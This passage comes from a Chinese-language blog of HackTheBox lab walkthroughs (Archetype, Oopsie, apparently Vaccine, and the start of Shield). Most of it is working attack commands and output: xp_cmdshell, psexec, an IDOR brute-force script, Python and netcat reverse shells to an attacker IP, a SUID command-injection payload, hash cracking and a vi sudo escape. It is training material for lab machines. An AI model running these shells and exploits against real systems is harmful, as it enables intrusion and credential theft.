INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; xp_cmdshell whoami</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">archetype\sql_svc                                                                  </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\desktop\user.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2>
<p><code>C:\users\sql_svc\appdata</code>为隐藏路径, 需要使用<code>dir /a</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!            </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>                                                                               </span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>
<p>通过查看powershell的历史记录得到administrator的账户</p>
<p><code>Archetype\administrator:MEGACORP_4dm1n!!</code></p>
<p>在使用<code>impacket</code>中的<code>psexec.py</code>来得到管理员权限的Shell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py archetype/administrator@10.10.10.27</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.10.27.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file OFvCNrQJ.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.27.....</span><br><span class="line">[*] Creating service SMtb on 10.10.10.27.....</span><br><span class="line">[*] Starting service SMtb.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\users\administrator\desktop\root.txt</span><br><span class="line">b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>尝试不使用psexec运行管理员权限命令的一波三折</p>
</blockquote>
<p>Windows下可以使用runas命令来以其他用户的身份运行命令<br />
如<code>runas /savecred /user:administrator whoami</code><br />
但是不能直接通过参数输入密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami</span><br><span class="line">试图将 whoami 作为用户 <span class="string">&quot;DOMAIN\administrator&quot;</span> 启动...</span><br><span class="line">输入 administrator 的密码:</span><br></pre></td></tr></table></figure>
<p>密码的输入需要以交互式的方式来输入, 就无法在MSSQL的非交互式Shell中直接提权</p>
<p>而可以使用sanur这个工具来进行密码的命令行输入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami | sanur.exe password</span><br></pre></td></tr></table></figure>
<p>但是紧接着问题又来了<br />
runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行, 这样的话就不能在MSSQL的Shell中看到回显</p>
<p>所以尝试了文件写入保存命令运行结果的方法</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator <span class="string">&quot;cmd /c whoami &gt; C:\1&quot;</span> | sanur.exe password</span><br></pre></td></tr></table></figure>
<p>本地运行成功了, 但是目标机器不行(无奈)</p>
<hr />
<h1 id="hackthebox_oopsie"><a class="markdownIt-Anchor" href="#hackthebox_oopsie"></a> HackTheBox_Oopsie</h1>
<p>Linux</p>
<h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.28</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.28</span><br><span class="line">Host is up (0.68s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE   VERSION</span><br><span class="line">22/tcp open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http            Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2>
<p>在首页的源码看到这样一条JS</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/cdn-cgi/login/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>得到路径<code>/cdn-cgi/login</code></p>
<p>访问该路径即为登入页面<br />
这里的登入需要使用上一台靶机的Administrator密码, 有点坑<br />
<code>admin:MEGACORP_4dm1n!!</code></p>
<p>访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />
提示<code>This action require super admin rights.</code><br />
且<code>Cookie</code>中的内容为<code>user=34322; role=admin</code><br />
那么只要能够得到<code>super admin</code>的<code>id</code>值与<code>username</code>即可越权</p>
<p><code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code><br />
访问该路径可以得到<code>admin</code>的账户信息<br />
可以通过爆破参数<code>id</code>来得到<code>super admin</code>的信息</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;user=34322; role=admin&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">    res = req.get(url, headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;super&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(_)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
<p>id为30, 得到如下信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access ID   Name            Email</span><br><span class="line">86575       super admin     superadmin@megacorp.com</span><br></pre></td></tr></table></figure>
<p>通过在Burpsuite中修改Cookie为<code>Cookie: user=86575; role=super admin</code>来访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />
上传weevely的Shell即可获得权限</p>
<h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2>
<p>使用python反弹Shell到本机</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
<p>获得tty<br />
(好像是用于获取一个终端会话, 否则后续的切换用户操作无法进行)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>之前查看用户信息的页面应该用到了SQL的操作<br />
那么就可以去找SQL的配置信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line"></span><br><span class="line">&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line">cat: cat: No such file or directory</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到账户信息<code>robert:M3g4C0rpUs3r!</code></p>
<p>使用该账户信息切换到用户<code>robert</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br><span class="line">M3g4C0rpUs3r!</span><br><span class="line">cat /home/robert/user.txt</span><br><span class="line"></span><br><span class="line">f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure>
<p>查找有SUID权限的文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>看到一个有意思的文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure>
<p>而该用户也有运行权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</span><br></pre></td></tr></table></figure>
<p>IDA中分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;\n------------------\n: EV Bug Tracker :\n------------------\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Provide Bug ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;---------------\n\n&quot;</span>);</span><br><span class="line">  v3 = geteuid();</span><br><span class="line">  setuid(v3);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)concat(<span class="string">&quot;cat /root/reports/&quot;</span>, v7);</span><br><span class="line">  system(v4);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用户输入<code>v7</code></li>
<li><code>v7</code>被拼接到&quot;cat /root/reports/&quot;之后在赋值给<code>v4</code></li>
<li>执行<code>v4</code></li>
</ul>
<p>命令注入</p>
<p>Payload: <code>;cat$IFS$9/root/root.txt</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ;cat$IFS<span class="variable">$9</span>/root/root.txt</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">cat: /root/reports/: Is a directory</span><br><span class="line">af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_archetype-2"><a class="markdownIt-Anchor" href="#hackthebox_archetype-2"></a> HackTheBox_Archetype</h1>
<p>Linux</p>
<h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.46</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.46</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2>
<blockquote>
<p>The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. – 官方WP</p>
</blockquote>
<blockquote>
<p>尝试使用上台靶机中获取的ftp凭据ftpuser/mc@F1l3ZilL4登录靶机的ftp服务<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qianxiaoyiran311/article/details/105988795">https://blog.csdn.net/qianxiaoyiran311/article/details/105988795</a></p>
</blockquote>
<p>得到FTP账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser:mc@F1l3ZilL4</span><br></pre></td></tr></table></figure>
<p>登入FTP服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.46</span><br><span class="line">Connected to 10.10.10.46.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.46:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get backup.zip</span><br><span class="line"><span class="built_in">local</span>: backup.zip remote: backup.zip</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> backup.zip (2533 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2533 bytes received <span class="keyword">in</span> 0.23 secs (10.7549 kB/s)</span><br></pre></td></tr></table></figure>
<p>爆破加密压缩包<code>backup.zip</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip backup.zip -D -p /usr/share/wordlists/rockyou.txt -u</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 741852963</span><br></pre></td></tr></table></figure>
<p>查看<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>爆破Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span> &gt; passwd</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwerty789        (?)</span><br><span class="line">1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimo</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session complete</span><br></pre></td></tr></table></figure>
<p>登入Web页面, 看到一个搜索功能<br />
使用sqlmap来getshell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
<p>sqlmap给出的shell不是很好用, 自己再弹个Shell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2>
<p>查看数据库信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = pg_connect(<span class="string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>得到账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres:P@s5w0rd!</span><br></pre></td></tr></table></figure>
<p>SSH登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.10.10.46</span><br><span class="line">P@s5w0rd!</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> postgres: P@s5w0rd!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> postgres on vaccine:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User postgres may run the following commands on vaccine:</span><br><span class="line">    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure>
<p>vi提权</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">dd6e058e814260bc70e9bbdef2715849</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>来自上一台靶机的FTP账户</p>
</blockquote>
<p>本着实践出真知的精神, 再看了一下上一台靶机<strong>Oopsie</strong>的端口开放情况</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1205/mysqld         </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      800/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1120/sshd           </span><br><span class="line">tcp        0    235 10.10.10.28:41042       10.10.16.51:9996        ESTABLISHED 2166/python3        </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1260/apache2        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      1120/sshd           </span><br><span class="line">tcp6       0      0 10.10.10.28:80          10.10.16.51:58936       ESTABLISHED 1963/apache2</span><br></pre></td></tr></table></figure>
<p>并没有FTP服务, 那么就是可能这种靶机顺序关系的变更</p>
<p>我个人不是很认同这种把敏感信息放在其他靶机泄露的设计<br />
确切来说, <strong>不应该把这种通过其他靶机泄露敏感信息作为唯一的攻击链</strong><br />
在给出这样的一条攻击链的时候应该再给出另外一个攻击链<br />
虽然这样的确能够对于连续的靶机渗透, 或者说多层靶机渗透的带来更加贯通的体验<br />
但是出现了这种顺序变更的情况之后就会显得十分弄巧成拙, 而且没有应有的后续修改<br />
没有<strong>user.txt</strong>也只是给这台机器的2.7分锦上添花了</p>
<hr />
<h1 id="hackthebox_shield"><a class="markdownIt-Anchor" href="#hackthebox_shield"></a> HackTheBox_Shield</h1>
<p>Windows</p>
<h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.29</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.29</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描-4"><a class="markdownIt-Anchor" href="#路径扫描-4"></a> 路径扫描</h2>
<p>扫描到路径<code>/wordpress</code><br />
<s>其实根本没扫, 网络环境太差了, 直接看WP的</s></p>
<h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2>
